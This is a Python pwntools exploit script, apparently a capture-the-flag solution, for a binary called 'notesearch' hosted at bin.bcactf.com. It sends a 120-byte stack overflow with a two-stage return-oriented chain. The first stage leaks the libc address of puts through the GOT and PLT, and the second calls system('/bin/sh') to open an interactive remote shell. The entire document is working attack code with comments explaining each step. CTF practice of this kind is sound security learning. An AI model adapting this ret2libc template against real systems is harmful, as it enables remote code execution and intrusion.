#!/usr/bin/env python3

from pwn import *
import binascii

# we are given the binary
elf = ELF("./notesearch")

# we leak libc with the below steps multiple times with different functions
# and then download it from https://libc.rip
libc = ELF('./libc.so.6')

# gadgets for args (it's 64 bit)
pop_rdi = 0x0000000000401703
ret = 0x000000000040101a

conn = remote("bin.bcactf.com", 49159)
conn.recvuntil("for: ")

payload = b'A'*120
payload += p64(pop_rdi) # rdi is for the first arg
payload += p64(elf.got['puts']) # first arg is the GOT entry of puts, points to puts in libc
payload += p64(elf.plt['puts']) # calls puts()
payload += p64(elf.symbols['main']) # calls main() after puts is run
conn.sendline(payload) # send this payload

conn.recvuntil("-------[ end of note data ]-------\n")

# recieve our leak, accounting for endianness
puts_libc = int(binascii.hexlify(conn.recvline()[::-1]).replace(b'0a', b'').decode(), 16)

log.info("puts() libc: " + hex(puts_libc))

libc.address = puts_libc - libc.symbols['puts'] # find the libc base
bin_sh = next(libc.search(b"/bin/sh")) # find the address of /bin/sh in libc
system_libc = libc.symbols['system'] # find the address of system() in libc

log.info("libc base: " + hex(libc.address))
log.info("system(): " + hex(system_libc))
log.info("/bin/sh: " + hex(bin_sh))

payload = b'A'*120
payload += p64(ret) # stack alignment :(
payload += p64(pop_rdi) # load first arg
payload += p64(bin_sh) # address of /bin/sh in libc
payload += p64(system_libc) # address of system() in libc
conn.sendline(payload)


log.info("You should have a shell now... ")
conn.interactive() # WE GET A SHELL!!!!!

